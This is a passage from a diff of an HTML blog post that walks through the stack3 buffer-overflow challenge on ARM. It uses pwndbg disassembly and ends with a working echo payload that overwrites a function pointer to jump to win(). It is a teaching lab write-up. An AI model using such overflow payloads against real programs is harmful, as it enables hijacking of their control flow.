+&lt;span class=&quot;mh&quot;&gt;0x10560&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;        &lt;span class=&quot;s&quot;&gt;&quot;code flow successfully changed&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, our target is:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdisass&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10484&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+ &lt;span class=&quot;err&quot;&gt;►&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1047c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lr&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10480&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;      &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10484&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10488&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+
+   &lt;span class=&quot;mh&quot;&gt;0x1048c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;pop&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;a-comment&quot;&gt;A comment&lt;/h3&gt;
+
+&lt;p&gt;This is not the only way to do it.&lt;/p&gt;
+
+&lt;p&gt;I could search for a &lt;code class=&quot;highlighter-rouge&quot;&gt;puts&lt;/code&gt; call which whole be more likely to be the
+one that we are looking for:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; stack3 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;puts&quot;&lt;/span&gt;
+00010324 &amp;lt;puts@plt&amp;gt;:
+   10488:       ebffffa5        bl      10324 &amp;lt;puts@plt&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I could look which functions are available:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;functions&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;All&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;defined&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;functions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;Non&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debugging&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x000102ec&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;_init&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0001030c&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00010318&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00010324&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0001047c&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00010494&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I could use IDA or &lt;a href=&quot;https://rada.re/n/radare2.html&quot;&gt;Radare2&lt;/a&gt; or similar
+and do a &lt;code class=&quot;highlighter-rouge&quot;&gt;xref&lt;/code&gt;…&lt;/p&gt;
+
+&lt;p&gt;Or I could just read what is the goal from the
+&lt;a href=&quot;https://azeria-labs.com/part-3-stack-overflow-challenges/&quot;&gt;challenge&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;I preferred a longer path to explore more the commands of &lt;code class=&quot;highlighter-rouge&quot;&gt;pwndbg&lt;/code&gt;
+and stress a little more my brain.&lt;/p&gt;
+
+&lt;p&gt;Otherwise it wouldn’t be fun :)&lt;/p&gt;
+
+&lt;h2 id=&quot;lets-jump&quot;&gt;Let’s jump&lt;/h2&gt;
+
+&lt;p&gt;This is the &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; function:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdisass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;
+ &lt;span class=&quot;err&quot;&gt;►&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10494&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lr&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10498&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x1049c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x104a0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;str&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x104a4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;str&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x54&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x104a8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x104ac&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;str&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x104b0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x104b4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x104b8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+
+   &lt;span class=&quot;mh&quot;&gt;0x104bc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x104c0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;44&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x104c4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;beq&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+
+   &lt;span class=&quot;mh&quot;&gt;0x104c8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x104cc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x104d0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+
+   &lt;span class=&quot;mh&quot;&gt;0x104d4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x104d8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;blx&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So instead of a cookie like in the
+&lt;a href=&quot;/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-I.html&quot;&gt;stack0&lt;/a&gt;
+or &lt;a href=&quot;/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-II.html&quot;&gt;stack1&lt;/a&gt;
+we have the address of a function.&lt;/p&gt;
+
+&lt;p&gt;&lt;label for=&quot;mn-5770f2836672d8a9a1954be60d8102c9&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mn-5770f2836672d8a9a1954be60d8102c9&quot; class=&quot;margin-toggle&quot; /&gt;&lt;span class=&quot;marginnote&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;blx r3&lt;/code&gt; is an unconditional jump to an absolute address
+(&lt;a href=&quot;https://developer.arm.com/documentation/dui0068/b/arm-instruction-reference/arm-branch-instructions/blx?lang=en&quot;&gt;docs&lt;/a&gt;).
+&lt;br /&gt;
+That's why it works.
+ &lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;The address is initialized to zero but due to a stack overflow we can
+write an arbitrary address, in particular, the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt;:
+0x0001047c&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x7c\x04\x01\x00'&lt;/span&gt; | ./stack3
+calling &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;pointer, jumping to 0x0001047c
+code flow successfully changed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We could also jump to the middle of &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt;, to 0x00010484, and we will
+have the same result. The only problem is that the program will execute
